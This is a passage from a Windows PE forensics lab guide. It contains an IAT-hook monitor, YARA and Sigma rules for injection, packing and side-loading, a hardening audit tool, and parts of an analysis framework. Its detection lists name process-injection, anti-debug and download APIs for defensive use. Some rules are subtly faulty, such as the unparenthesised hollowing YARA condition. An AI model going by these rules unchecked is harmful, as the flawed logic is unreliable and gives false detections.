                key = f"{dll_name}@{first_thunk + iat_offset:08X}"
                imports[key] = iat_value
                iat_offset += 8

            offset += 20

        return imports

    def establish_baseline(self):
        """Take initial IAT snapshot."""
        modules = self.get_modules()
        if not modules:
            print("[-] No modules found")
            return

        main_module = modules[0]
        print(f"[+] Baseline for: {main_module['name']}")

        self.baseline = self.scan_iat(main_module['base'])
        print(f"[+] Captured {len(self.baseline)} IAT entries")

    def check_integrity(self):
        """Compare current IAT against baseline."""
        modules = self.get_modules()
        if not modules:
            return []

        current = self.scan_iat(modules[0]['base'])
        hooks = []

        for key, original_addr in self.baseline.items():
            if key in current:
                if current[key] != original_addr:
                    hooks.append({
                        'entry': key,
                        'original': f'0x{original_addr:016X}',
                        'current': f'0x{current[key]:016X}',
                    })

        return hooks

    def monitor(self, interval=2.0):
        """Continuous monitoring loop."""
        self.establish_baseline()
        print(f"[+] Monitoring PID {self.pid} every {interval}s...")
        print("[+] Press Ctrl+C to stop\n")

        try:
            while True:
                hooks = self.check_integrity()
                if hooks:
                    print(f"[!] {len(hooks)} IAT hook(s) detected!")
                    for h in hooks:
                        print(f"    {h['entry']}")
                        print(f"      Original: {h['original']}")
                        print(f"      Current : {h['current']}")
                else:
                    ts = time.strftime('%H:%M:%S')
                    print(f"  [{ts}] IAT clean — {len(self.baseline)} entries verified")

                time.sleep(interval)
        except KeyboardInterrupt:
            print("\n[+] Monitoring stopped")

    def close(self):
        if self.handle:
            kernel32.CloseHandle(self.handle)

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <pid>")
        sys.exit(1)

    monitor = IATMonitor(int(sys.argv[1]))
    try:
        monitor.monitor()
    finally:
        monitor.close()
```

---

### Exercise 3: YARA Rules for PE Detection

**Objective:** Deploy a comprehensive YARA ruleset covering all PE anomaly indicators from the source document.

```yara
/* C:\PELab\rules\pe_anomalies.yar
 * Comprehensive PE anomaly detection rules.
 */

import "pe"
import "math"

rule PE_EntryPoint_Outside_Text {
    meta:
        description = "Entry point not in .text section"
        severity    = "MEDIUM"
        mitre       = "T1027"
    condition:
        uint16(0) == 0x5A4D and
        pe.entry_point_raw != 0 and
        for all i in (0..pe.number_of_sections - 1) : (
            not (pe.sections[i].name == ".text" and
                 pe.entry_point >= pe.sections[i].raw_data_offset and
                 pe.entry_point < pe.sections[i].raw_data_offset +
                                   pe.sections[i].raw_data_size)
        )
}

rule PE_High_Entropy_Code {
    meta:
        description = "Executable section with entropy > 7.0 — packed"
        severity    = "HIGH"
        mitre       = "T1027.002"
    condition:
        uint16(0) == 0x5A4D and
        for any i in (0..pe.number_of_sections - 1) : (
            (pe.sections[i].characteristics & 0x20000000) != 0 and
            pe.sections[i].raw_data_size > 512 and
            math.entropy(pe.sections[i].raw_data_offset,
                         pe.sections[i].raw_data_size) > 7.0
        )
}

rule PE_RWX_Section {
    meta:
        description = "Section with Read+Write+Execute"
        severity    = "HIGH"
        mitre       = "T1055"
    condition:
        uint16(0) == 0x5A4D and
        for any i in (0..pe.number_of_sections - 1) : (
            (pe.sections[i].characteristics & 0xE0000000) == 0xE0000000
        )
}

rule PE_TLS_Callbacks {
    meta:
        description = "TLS callbacks present — pre-EP execution"
        severity    = "MEDIUM"
        mitre       = "T1106"
    condition:
        uint16(0) == 0x5A4D and
        pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_TLS].virtual_address != 0 and
        pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_TLS].size > 0
}

rule PE_Injection_API_Triple {
    meta:
        description = "Classic process injection API combination"
        severity    = "HIGH"
        mitre       = "T1055.001"
    condition:
        uint16(0) == 0x5A4D and
        pe.imports("kernel32.dll", "VirtualAllocEx") and
        pe.imports("kernel32.dll", "WriteProcessMemory") and
        (pe.imports("kernel32.dll", "CreateRemoteThread") or
         pe.imports("ntdll.dll", "NtCreateThreadEx"))
}

rule PE_Process_Hollowing_APIs {
    meta:
        description = "Process hollowing API combination"
        severity    = "HIGH"
        mitre       = "T1055.012"
    condition:
        uint16(0) == 0x5A4D and
        pe.imports("kernel32.dll", "CreateProcessA") or
        pe.imports("kernel32.dll", "CreateProcessW") and
        (pe.imports("ntdll.dll", "NtUnmapViewOfSection") or
         pe.imports("ntdll.dll", "ZwUnmapViewOfSection"))
}

rule PE_No_Authenticode {
    meta:
        description = "PE without Authenticode signature"
        severity    = "LOW"
    condition:
        uint16(0) == 0x5A4D and
        pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_SECURITY].size == 0
}

rule PE_ASLR_Disabled {
    meta:
        description = "ASLR disabled on PE binary"
        severity    = "HIGH"
        mitre       = "T1562"
    condition:
        uint16(0) == 0x5A4D and
        not (pe.dll_characteristics & pe.DYNAMIC_BASE)
}

rule PE_DEP_Disabled {
    meta:
        description = "DEP/NX disabled on PE binary"
        severity    = "HIGH"
    condition:
        uint16(0) == 0x5A4D and
        not (pe.dll_characteristics & pe.NX_COMPAT)
}

rule PE_Rich_Header_Absent {
    meta:
        description = "Rich header absent — provenance stripped"
        severity    = "LOW"
    condition:
        uint16(0) == 0x5A4D and
        (not defined pe.rich_signature.offset or
         pe.rich_signature.length == 0)
}

rule PE_Packer_UPX {
    meta:
        description = "UPX packed binary"
        severity    = "MEDIUM"
        mitre       = "T1027.002"
    condition:
        uint16(0) == 0x5A4D and
        for any i in (0..pe.number_of_sections - 1) : (
            pe.sections[i].name == "UPX0" or
            pe.sections[i].name == "UPX1"
        )
}

rule PE_Packer_VMProtect {
    meta:
        description = "VMProtect packed binary"
        severity    = "HIGH"
        mitre       = "T1027.002"
    condition:
        uint16(0) == 0x5A4D and
        for any i in (0..pe.number_of_sections - 1) : (
            pe.sections[i].name == ".vmp0" or
            pe.sections[i].name == ".vmp1"
        )
}

rule PE_Packer_Themida {
    meta:
        description = "Themida/WinLicense protected binary"
        severity    = "HIGH"
        mitre       = "T1027.002"
    condition:
        uint16(0) == 0x5A4D and
        for any i in (0..pe.number_of_sections - 1) : (
            pe.sections[i].name == ".themida" or
            pe.sections[i].name == ".winlice"
        )
}

rule PE_Few_Imports {
    meta:
        description = "Very few imports — likely packed"
        severity    = "MEDIUM"
        mitre       = "T1027.002"
    condition:
        uint16(0) == 0x5A4D and
        pe.number_of_imports < 5 and
        pe.number_of_imports > 0
}

rule PE_Embedded_PE_In_Resource {
    meta:
        description = "PE file embedded in resource section"
        severity    = "HIGH"
        mitre       = "T1027.009"
    strings:
        $mz = "MZ" ascii
    condition:
        uint16(0) == 0x5A4D and
        for any i in (0..pe.number_of_resources - 1) : (
            pe.resources[i].type == pe.RESOURCE_TYPE_RCDATA and
            pe.resources[i].length > 4096 and
            $mz at pe.resources[i].offset
        )
}

rule PE_Anti_Debug_Imports {
    meta:
        description = "Anti-debug API imports"
        severity    = "MEDIUM"
        mitre       = "T1622"
    condition:
        uint16(0) == 0x5A4D and
        (pe.imports("kernel32.dll", "IsDebuggerPresent") or
         pe.imports("kernel32.dll", "CheckRemoteDebuggerPresent") or
         pe.imports("ntdll.dll", "NtQueryInformationProcess"))
}
```

#### Deploy and scan

```powershell
# Scan a single file
yara64.exe C:\PELab\rules\pe_anomalies.yar C:\PELab\samples\hello_weak.exe

# Scan a directory recursively
yara64.exe -r C:\PELab\rules\pe_anomalies.yar C:\PELab\samples\
```

---

### Exercise 4: PE Hardening Audit Pipeline

**Objective:** Build an automated hardening verification tool that checks every mitigation field from the source document and produces a compliance report suitable for CI/CD integration.

```python
#!/usr/bin/env python3
"""C:\PELab\tools\pe_hardening_audit.py
Automated PE hardening audit with CI/CD exit codes.
Checks: ASLR, DEP, CFG, XFG, /GS, SafeSEH, CET, Authenticode,
        .reloc presence, FORCE_INTEGRITY, High-Entropy VA.
"""
import pefile
import json
import sys

class HardeningAudit:
    """PE binary hardening compliance checker."""

    def __init__(self, filepath):
        self.filepath = filepath
        self.pe = pefile.PE(filepath)
        self.results = []
        self.passed = 0
        self.failed = 0
        self.na = 0

    def _check(self, name, condition, na_condition=False):
        if na_condition:
            self.results.append({'check': name, 'status': 'N/A'})
            self.na += 1
        elif condition:
            self.results.append({'check': name, 'status': 'PASS'})
            self.passed += 1
        else:
            self.results.append({'check': name, 'status': 'FAIL'})
            self.failed += 1

    def audit(self):
        dc = self.pe.OPTIONAL_HEADER.DllCharacteristics
        is_pe32 = (self.pe.OPTIONAL_HEADER.Magic == 0x10B)

        # ASLR
        aslr = bool(dc & 0x0040)
        self._check("ASLR (DYNAMIC_BASE)", aslr)

        # High-Entropy VA (64-bit only)
        self._check("High-Entropy VA",
                     bool(dc & 0x0020),
                     na_condition=is_pe32)

        # ASLR + .reloc consistency
        reloc_dir = self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[5]
        reloc_stripped = bool(self.pe.FILE_HEADER.Characteristics & 0x0001)
        effective_aslr = aslr and reloc_dir.Size > 0 and not reloc_stripped
        self._check("ASLR Effective (.reloc populated)", effective_aslr)

        # DEP
        self._check("DEP (NX_COMPAT)", bool(dc & 0x0100))

        # CFG
        cfg = bool(dc & 0x4000)
        self._check("CFG (GUARD_CF)", cfg)

        # CFG function table
        if cfg and hasattr(self.pe, 'DIRECTORY_ENTRY_LOAD_CONFIG'):
            lc = self.pe.DIRECTORY_ENTRY_LOAD_CONFIG.struct
            has_cfg_table = (hasattr(lc, 'GuardCFFunctionCount') and
                            lc.GuardCFFunctionCount > 0)
            self._check("CFG Function Table Populated", has_cfg_table)
        else:
            self._check("CFG Function Table Populated", False,
                         na_condition=not cfg)

        # /GS Stack Cookie
        if hasattr(self.pe, 'DIRECTORY_ENTRY_LOAD_CONFIG'):
            lc = self.pe.DIRECTORY_ENTRY_LOAD_CONFIG.struct
            has_cookie = (hasattr(lc, 'SecurityCookie') and
                         lc.SecurityCookie != 0)
            self._check("/GS Stack Cookie", has_cookie)
        else:
            self._check("/GS Stack Cookie", False)

        # SafeSEH (x86 only)
        if is_pe32:
            if hasattr(self.pe, 'DIRECTORY_ENTRY_LOAD_CONFIG'):
                lc = self.pe.DIRECTORY_ENTRY_LOAD_CONFIG.struct
                has_safeseh = (hasattr(lc, 'SEHandlerCount') and
                              lc.SEHandlerCount > 0)
                self._check("SafeSEH", has_safeseh)
            else:
                self._check("SafeSEH", False)
        else:
            self._check("SafeSEH", True, na_condition=True)

        # NO_SEH
        self._check("NO_SEH Declared", bool(dc & 0x0400))

        # Force Integrity
        self._check("Force Integrity", bool(dc & 0x0080))

        # Authenticode
        cert_dir = self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[4]
        has_auth = cert_dir.VirtualAddress != 0 and cert_dir.Size > 0
        self._check("Authenticode Signature", has_auth)

        # CET Shadow Stack
        has_cet = False
        if hasattr(self.pe, 'DIRECTORY_ENTRY_DEBUG'):
            for dbg in self.pe.DIRECTORY_ENTRY_DEBUG:
                if dbg.struct.Type == 20:
                    has_cet = True
                    break
        self._check("CET Shadow Stack Compatible", has_cet)

        # No RWX sections
        has_rwx = False
        for sec in self.pe.sections:
            if (sec.Characteristics & 0xE0000000) == 0xE0000000:
                has_rwx = True
                break
        self._check("No RWX Sections", not has_rwx)

        return self.results

    def report(self, format='text'):
        if format == 'json':
            return json.dumps({
                'file': self.filepath,
                'passed': self.passed,
                'failed': self.failed,
                'na': self.na,
                'checks': self.results
            }, indent=2)

        lines = [
            f"\nPE Hardening Audit: {self.filepath}",
            f"{'=' * 55}",
        ]
        for r in self.results:
            icon = '[+]' if r['status'] == 'PASS' else (
                   '[~]' if r['status'] == 'N/A' else '[-]')
            lines.append(f"  {icon} {r['check']:<40} {r['status']}")

        lines.append(f"{'=' * 55}")
        lines.append(f"  PASS: {self.passed}  FAIL: {self.failed}  N/A: {self.na}")

        if self.failed == 0:
            lines.append("  VERDICT: ALL CHECKS PASSED")
        else:
            lines.append(f"  VERDICT: {self.failed} DEFICIENCIES FOUND")

        return '\n'.join(lines)

    def exit_code(self):
        """Return CI-compatible exit code: 0=pass, 1=fail."""
        return 0 if self.failed == 0 else 1

    def close(self):
        self.pe.close()


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <pe_file> [--json] [--ci]")
        sys.exit(1)

    audit = HardeningAudit(sys.argv[1])
    audit.audit()

    fmt = 'json' if '--json' in sys.argv else 'text'
    print(audit.report(fmt))

    if '--ci' in sys.argv:
        sys.exit(audit.exit_code())

    audit.close()

if __name__ == '__main__':
    main()
```

**CI/CD integration example (GitHub Actions):**

```yaml
# .github/workflows/pe-hardening.yml
name: PE Hardening Gate
on: [push, pull_request]
jobs:
  audit:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'
      - run: pip install pefile
      - run: python pe_hardening_audit.py build/output.exe --ci
```

---

### Exercise 5: Sigma Rules for PE Injection Detection

**Objective:** Deploy Sigma rules covering process hollowing, reflective DLL loading, DLL side-loading, and TLS-based anti-debug.

```yaml
# C:\PELab\rules\sigma\process_hollowing.yml
title: Process Hollowing via Suspended Process Creation and Memory Manipulation
id: 7a2b3c4d-5e6f-7890-abcd-ef1234567890
status: experimental
description: |
  Detects process hollowing by correlating suspended process creation
  with subsequent memory manipulation (NtUnmapViewOfSection + VirtualAllocEx).
logsource:
    category: process_creation
    product: windows
detection:
    selection_suspended:
        EventID: 1
        CommandLine|contains:
            - 'CREATE_SUSPENDED'
    selection_access:
        EventID: 10
        GrantedAccess|contains:
            - '0x1FFFFF'
            - '0x1F0FFF'
            - '0x0800'
    filter_legitimate:
        SourceImage|endswith:
            - '\WerFault.exe'
            - '\MsMpEng.exe'
            - '\svchost.exe'
            - '\csrss.exe'
    condition: (selection_suspended or selection_access) and not filter_legitimate
level: high
tags:
    - attack.defense_evasion
    - attack.t1055.012
    - attack.execution
```

```yaml
# C:\PELab\rules\sigma\reflective_dll.yml
title: Reflective DLL Loading - Executable Memory Without Backing Module
id: b1c2d3e4-f5a6-7890-1234-567890abcdef
status: experimental
description: |
  Detects reflective DLL injection by identifying image load events
  where the loaded image has no backing file path, indicating
  in-memory-only PE loading.
logsource:
    category: image_load
    product: windows
detection:
    selection:
        EventID: 7
        ImageLoaded: ''
    filter_dotnet:
        ImageLoaded|contains:
            - '\Assembly\NativeImages'
            - '\clrjit.dll'
            - '\mscorjit.dll'
    filter_jit:
        ImageLoaded|contains:
            - 'DynamicAssembly'
    condition: selection and not (filter_dotnet or filter_jit)
level: high
tags:
    - attack.defense_evasion
    - attack.t1620
```

```yaml
# C:\PELab\rules\sigma\dll_sideloading.yml
title: DLL Side-Loading - Unsigned DLL Loaded from Application Directory
id: c3d4e5f6-a7b8-9012-3456-78901234abcd
status: experimental
description: |
  Detects potential DLL side-loading where a signed executable loads
  an unsigned DLL from its own directory instead of System32.
logsource:
    category: image_load
    product: windows
detection:
    selection:
        EventID: 7
        Signed: 'false'
        ImageLoaded|endswith:
            - '\version.dll'
            - '\winmm.dll'
            - '\userenv.dll'
            - '\dbghelp.dll'
            - '\winhttp.dll'
            - '\dwrite.dll'
            - '\msvcp140.dll'
            - '\vcruntime140.dll'
    filter_system:
        ImageLoaded|startswith:
            - 'C:\Windows\System32\'
            - 'C:\Windows\SysWOW64\'
            - 'C:\Windows\WinSxS\'
    condition: selection and not filter_system
level: high
tags:
    - attack.persistence
    - attack.privilege_escalation
    - attack.t1574.002
```

---

## PART C: FRAMEWORK DEVELOPMENT

### PEForensics — Unified PE Analysis Framework

**Objective:** Build a complete, reusable Python framework that combines all tools from Parts A and B into a single command-line tool with subcommands for triage, hardening audit, anomaly scan, section analysis, import analysis, resource inspection, and report generation.

#### Project structure

```
C:\PELab\framework\
├── peforensics/
│   ├── __init__.py
│   ├── cli.py           # Main CLI entry point
│   ├── triage.py         # Quick triage module
│   ├── hardening.py      # Hardening audit
│   ├── anomalies.py      # Anomaly detection engine
│   ├── sections.py       # Section analysis
│   ├── imports.py        # Import/export analysis
│   ├── resources.py      # Resource inspection
│   ├── signing.py        # Authenticode analysis
│   └── report.py         # Report generation
├── setup.py
└── README.md
```

#### `peforensics/__init__.py`

```python
"""PEForensics — Unified PE Analysis Framework for security professionals."""
__version__ = "1.0.0"
```

#### `peforensics/cli.py`

```python
#!/usr/bin/env python3
"""PEForensics CLI — unified PE analysis tool.

Usage:
    peforensics triage <file>          Quick triage scan
    peforensics audit <file>           Hardening compliance check
    peforensics anomaly <file>         Full anomaly detection
    peforensics sections <file>        Section analysis
    peforensics imports <file>         Import/export analysis
    peforensics resources <file>       Resource inspection
    peforensics full <file>            All checks combined
    peforensics batch <directory>      Scan all PEs in directory
"""
import argparse
import os
import sys
import json
import hashlib
import pefile
import math
import datetime

from peforensics.triage import PETriage
from peforensics.hardening import HardeningAudit
from peforensics.anomalies import AnomalyEngine
from peforensics.sections import SectionAnalyzer
from peforensics.imports import ImportAnalyzer
from peforensics.resources import ResourceInspector
from peforensics.report import ReportGenerator


def main():
    parser = argparse.ArgumentParser(
        prog='peforensics',
        description='PEForensics — Unified PE Analysis Framework')
    parser.add_argument('command',
        choices=['triage', 'audit', 'anomaly', 'sections',
                 'imports', 'resources', 'full', 'batch'],
        help='Analysis command')
    parser.add_argument('target', help='PE file or directory path')
    parser.add_argument('--json', action='store_true',
                        help='Output as JSON')
    parser.add_argument('--ci', action='store_true',
                        help='Exit with code 1 on failures')
    parser.add_argument('--output', '-o', help='Write report to file')

    args = parser.parse_args()

    if args.command == 'batch':
        results = batch_scan(args.target, args.json)
    else:
        results = single_scan(args.target, args.command, args.json)

    if args.output:
        with open(args.output, 'w') as f:
            f.write(results)
        print(f"[+] Report written to: {args.output}")
    else:
        print(results)

    if args.ci and 'FAIL' in results:
        sys.exit(1)


def single_scan(filepath, command, as_json=False):
    """Run a single analysis command on a PE file."""
    if not os.path.isfile(filepath):
        return f"[-] File not found: {filepath}"

    try:
        pe = pefile.PE(filepath)
    except pefile.PEFormatError as e:
        return f"[-] Invalid PE file: {e}"

    with open(filepath, 'rb') as f:
        raw = f.read()

    report = ReportGenerator(filepath, raw, pe)

    if command == 'triage':
        triage = PETriage(pe, raw)
        triage.run()
        report.add_section('triage', triage.results)

    elif command == 'audit':
        audit = HardeningAudit(pe)
        audit.run()
        report.add_section('hardening', audit.results)

    elif command == 'anomaly':
        engine = AnomalyEngine(pe, raw, filepath)
        engine.run()
        report.add_section('anomalies', engine.findings)

    elif command == 'sections':
        analyzer = SectionAnalyzer(pe)
        analyzer.run()
        report.add_section('sections', analyzer.results)

    elif command == 'imports':
        imp = ImportAnalyzer(pe)
        imp.run()
        report.add_section('imports', imp.results)

    elif command == 'resources':
        inspector = ResourceInspector(pe)
        inspector.run()
        report.add_section('resources', inspector.results)

    elif command == 'full':
        for cls in [PETriage, HardeningAudit, AnomalyEngine,
                     SectionAnalyzer, ImportAnalyzer, ResourceInspector]:
            if cls == AnomalyEngine:
                mod = cls(pe, raw, filepath)
            elif cls == PETriage:
                mod = cls(pe, raw)
            else:
                mod = cls(pe)
            mod.run()
            report.add_section(cls.__name__, mod.results
                                if hasattr(mod, 'results') else mod.findings)

    pe.close()
    return report.render('json' if as_json else 'text')


def batch_scan(directory, as_json=False):
    """Scan all PE files in a directory."""
    results = []
    pe_extensions = {'.exe', '.dll', '.sys', '.scr', '.ocx'}

    for root, _, files in os.walk(directory):
        for fname in files:
            if os.path.splitext(fname)[1].lower() in pe_extensions:
                fpath = os.path.join(root, fname)
                result = single_scan(fpath, 'triage', as_json)
                results.append(result)

    return '\n\n'.join(results)


if __name__ == '__main__':
    main()
```

#### `peforensics/triage.py`

```python
"""Quick PE triage — fast overview of key indicators."""
import hashlib
import math
import datetime


class PETriage:
    """Fast PE triage: hashes, mitigations, sections, suspicious imports."""

    SUSPICIOUS_IMPORTS = {
        'VirtualAllocEx', 'WriteProcessMemory', 'CreateRemoteThread',
        'NtUnmapViewOfSection', 'NtWriteVirtualMemory',
        'IsDebuggerPresent', 'NtQueryInformationProcess',
        'AdjustTokenPrivileges', 'GetProcAddress', 'LoadLibraryA',
    }

    def __init__(self, pe, raw_data):
        self.pe = pe
        self.raw = raw_data
        self.results = {}

    @staticmethod
    def entropy(data):
        if not data:
            return 0.0
        freq = [0] * 256
        for b in data:
            freq[b] += 1
        length = len(data)
        return -sum((f/length) * math.log2(f/length) for f in freq if f > 0)

    def run(self):
        # File hashes
        self.results['hashes'] = {
            'md5': hashlib.md5(self.raw).hexdigest(),
            'sha1': hashlib.sha1(self.raw).hexdigest(),
            'sha256': hashlib.sha256(self.raw).hexdigest(),
        }

        # Header info
        ts = self.pe.FILE_HEADER.TimeDateStamp
        try:
            link_time = datetime.datetime.utcfromtimestamp(ts).isoformat() + 'Z'
        except (OSError, ValueError):
            link_time = f'invalid (0x{ts:08X})'

        self.results['header'] = {
            'machine': f'0x{self.pe.FILE_HEADER.Machine:04X}',
            'sections': self.pe.FILE_HEADER.NumberOfSections,
            'timestamp': link_time,
            'entry_point': f'0x{self.pe.OPTIONAL_HEADER.AddressOfEntryPoint:08X}',
            'image_base': f'0x{self.pe.OPTIONAL_HEADER.ImageBase:016X}',
        }

        # Mitigations
        dc = self.pe.OPTIONAL_HEADER.DllCharacteristics
        self.results['mitigations'] = {
            'ASLR': bool(dc & 0x0040),
            'DEP': bool(dc & 0x0100),
            'CFG': bool(dc & 0x4000),
            'HighEntropyVA': bool(dc & 0x0020),
            'ForceIntegrity': bool(dc & 0x0080),
        }

        # Sections
        self.results['sections'] = []
        for sec in self.pe.sections:
            name = sec.Name.rstrip(b'\x00').decode('utf-8', errors='replace')
            data = sec.get_data()
            ent = self.entropy(data)
            perms = []
            if sec.Characteristics & 0x20000000: perms.append('X')
            if sec.Characteristics & 0x40000000: perms.append('R')
            if sec.Characteristics & 0x80000000: perms.append('W')
            flags = []
            if ent > 7.0: flags.append('PACKED')
            if 'X' in perms and 'W' in perms: flags.append('W^X')
            self.results['sections'].append({
                'name': name,
                'vaddr': f'0x{sec.VirtualAddress:08X}',
                'vsize': sec.Misc_VirtualSize,
                'rsize': sec.SizeOfRawData,
                'entropy': round(ent, 4),
                'perms': ''.join(perms),
                'flags': flags,
            })

        # Suspicious imports
        self.results['suspicious_imports'] = []
        if hasattr(self.pe, 'DIRECTORY_ENTRY_IMPORT'):
            for entry in self.pe.DIRECTORY_ENTRY_IMPORT:
                for imp in entry.imports:
                    if imp.name:
                        fname = imp.name.decode('utf-8', errors='replace')
                        if fname in self.SUSPICIOUS_IMPORTS:
                            dll = entry.dll.decode('utf-8', errors='replace')
                            self.results['suspicious_imports'].append(
                                f'{dll}!{fname}')

        # TLS
        self.results['tls_callbacks'] = hasattr(self.pe, 'DIRECTORY_ENTRY_TLS')

        # Authenticode
        cert = self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[4]
        self.results['authenticode'] = (
            cert.VirtualAddress != 0 and cert.Size > 0)

        return self.results
```

#### `peforensics/hardening.py`

```python
"""PE hardening compliance checks."""


class HardeningAudit:
    """Check all PE hardening mitigations."""

    def __init__(self, pe):
        self.pe = pe
        self.results = []

    def _check(self, name, passed, na=False):
        status = 'N/A' if na else ('PASS' if passed else 'FAIL')
        self.results.append({'check': name, 'status': status})

    def run(self):
        dc = self.pe.OPTIONAL_HEADER.DllCharacteristics
        is32 = (self.pe.OPTIONAL_HEADER.Magic == 0x10B)

        self._check('ASLR (DYNAMIC_BASE)', bool(dc & 0x0040))
        self._check('High-Entropy VA', bool(dc & 0x0020), na=is32)
        self._check('DEP (NX_COMPAT)', bool(dc & 0x0100))
        self._check('CFG (GUARD_CF)', bool(dc & 0x4000))
        self._check('NO_SEH', bool(dc & 0x0400))
        self._check('Force Integrity', bool(dc & 0x0080))

        # .reloc check
        reloc = self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[5]
        stripped = bool(self.pe.FILE_HEADER.Characteristics & 0x0001)
        self._check('.reloc Present', reloc.Size > 0 and not stripped)

        # /GS Cookie
        has_cookie = False
        if hasattr(self.pe, 'DIRECTORY_ENTRY_LOAD_CONFIG'):
            lc = self.pe.DIRECTORY_ENTRY_LOAD_CONFIG.struct
            has_cookie = hasattr(lc, 'SecurityCookie') and lc.SecurityCookie != 0
        self._check('/GS Stack Cookie', has_cookie)

        # Authenticode
        cert = self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[4]
        self._check('Authenticode', cert.VirtualAddress != 0 and cert.Size > 0)

        # CET
        has_cet = False
        if hasattr(self.pe, 'DIRECTORY_ENTRY_DEBUG'):
            for dbg in self.pe.DIRECTORY_ENTRY_DEBUG:
                if dbg.struct.Type == 20:
                    has_cet = True
        self._check('CET Compatible', has_cet)

        # No RWX
        has_rwx = any(
            (s.Characteristics & 0xE0000000) == 0xE0000000
            for s in self.pe.sections)
        self._check('No RWX Sections', not has_rwx)

        return self.results
```

#### `peforensics/sections.py`

```python
"""PE section analysis module."""
import math


class SectionAnalyzer:
    """Analyze PE sections for anomalies."""

    NORMAL_NAMES = {
        '.text', '.rdata', '.data', '.rsrc', '.reloc', '.pdata',
        '.edata', '.idata', '.CRT', '.tls', '.bss', '.didat',
        '.debug', '.xdata', '.cfg', '.gfids',
    }

    PACKER_NAMES = {
        'UPX0', 'UPX1', 'UPX2', '.vmp0', '.vmp1', '.themida',
        '.winlice', '.enigma1', '.enigma2', '.MPRESS1', '.MPRESS2',
    }

    def __init__(self, pe):
        self.pe = pe
        self.results = []

    @staticmethod
    def entropy(data):
        if not data:
            return 0.0
        freq = [0] * 256
        for b in data:
            freq[b] += 1
        n = len(data)
        return -sum((f/n) * math.log2(f/n) for f in freq if f > 0)

    def run(self):
        for sec in self.pe.sections:
            name = sec.Name.rstrip(b'\x00').decode('utf-8', errors='replace')
            data = sec.get_data()
            ent = self.entropy(data)

            flags = []
            chars = sec.Characteristics

            if (chars & 0x20000000) and (chars & 0x80000000):
                flags.append('W^X')
            if ent > 7.0 and sec.SizeOfRawData > 512:
                flags.append('HIGH_ENTROPY')
            if name in self.PACKER_NAMES:
                flags.append('PACKER_NAME')
            elif name not in self.NORMAL_NAMES and not name.startswith('.'):
                flags.append('UNUSUAL_NAME')
            if sec.Misc_VirtualSize > sec.SizeOfRawData * 10:
                flags.append('INFLATED_VSIZE')

            perms = []
            if chars & 0x20000000: perms.append('X')
            if chars & 0x40000000: perms.append('R')
            if chars & 0x80000000: perms.append('W')

            self.results.append({
                'name': name,
                'vaddr': f'0x{sec.VirtualAddress:08X}',
                'vsize': sec.Misc_VirtualSize,
                'raw_offset': f'0x{sec.PointerToRawData:08X}',
                'raw_size': sec.SizeOfRawData,
                'characteristics': f'0x{chars:08X}',
                'permissions': ''.join(perms),
                'entropy': round(ent, 4),
                'flags': flags,
            })

        return self.results
```

#### `peforensics/imports.py`

```python
"""PE import/export analysis module."""


class ImportAnalyzer:
    """Analyze PE imports and exports."""

    INJECTION_APIS = {
        'VirtualAllocEx', 'WriteProcessMemory', 'CreateRemoteThread',
        'NtUnmapViewOfSection', 'QueueUserAPC', 'SetThreadContext',
        'NtCreateThreadEx', 'NtMapViewOfSection',
    }

    EVASION_APIS = {
        'IsDebuggerPresent', 'CheckRemoteDebuggerPresent',
        'NtQueryInformationProcess', 'GetTickCount', 'QueryPerformanceCounter',
    }

    CRYPTO_APIS = {
        'CryptEncrypt', 'CryptDecrypt', 'CryptAcquireContextA',
        'CryptCreateHash', 'CryptHashData', 'CryptDeriveKey',
    }

    NETWORK_APIS = {
        'InternetOpenA', 'InternetOpenUrlA', 'HttpSendRequestA',
        'URLDownloadToFileA', 'WinHttpOpen', 'WinHttpConnect',
    }

    def __init__(self, pe):
        self.pe = pe
        self.results = {
            'imports': [],
            'exports': [],
            'suspicious': [],
            'categories': {},
        }

    def run(self):
        # Analyze imports
        if hasattr(self.pe, 'DIRECTORY_ENTRY_IMPORT'):
            for entry in self.pe.DIRECTORY_ENTRY_IMPORT:
                dll = entry.dll.decode('utf-8', errors='replace')
                functions = []
                for imp in entry.imports:
                    if imp.name:
                        fname = imp.name.decode('utf-8', errors='replace')
                        functions.append(fname)

                        # Categorize
                        if fname in self.INJECTION_APIS:
                            self.results['suspicious'].append(
                                {'dll': dll, 'func': fname, 'category': 'injection'})
                        elif fname in self.EVASION_APIS:
                            self.results['suspicious'].append(
                                {'dll': dll, 'func': fname, 'category': 'evasion'})
                        elif fname in self.CRYPTO_APIS:
                            self.results['suspicious'].append(
                                {'dll': dll, 'func': fname, 'category': 'crypto'})
                        elif fname in self.NETWORK_APIS:
                            self.results['suspicious'].append(
                                {'dll': dll, 'func': fname, 'category': 'network'})
                    else:
                        functions.append(f'Ordinal#{imp.ordinal}')

                self.results['imports'].append({
                    'dll': dll,
                    'count': len(functions),
                    'has_ilt': entry.struct.OriginalFirstThunk != 0,
                })

        # Analyze exports
        if hasattr(self.pe, 'DIRECTORY_ENTRY_EXPORT'):
            exp = self.pe.DIRECTORY_ENTRY_EXPORT
            for sym in exp.symbols:
                self.results['exports'].append({
                    'name': sym.name.decode('utf-8', errors='replace') if sym.name else None,
                    'ordinal': sym.ordinal,
                    'address': f'0x{sym.address:08X}' if sym.address else None,
                    'forwarder': sym.forwarder.decode('utf-8', errors='replace') if sym.forwarder else None,
                })

        return self.results
```

#### `peforensics/resources.py`

```python
"""PE resource inspection module."""
import math


class ResourceInspector:
    """Inspect PE resources for embedded payloads and anomalies."""

    RESOURCE_TYPES = {
        1: 'RT_CURSOR', 2: 'RT_BITMAP', 3: 'RT_ICON', 4: 'RT_MENU',
        5: 'RT_DIALOG', 6: 'RT_STRING', 7: 'RT_FONTDIR', 8: 'RT_FONT',
        9: 'RT_ACCELERATOR', 10: 'RT_RCDATA', 11: 'RT_MESSAGETABLE',
        12: 'RT_GROUP_CURSOR', 14: 'RT_GROUP_ICON', 16: 'RT_VERSION',
        24: 'RT_MANIFEST',
    }

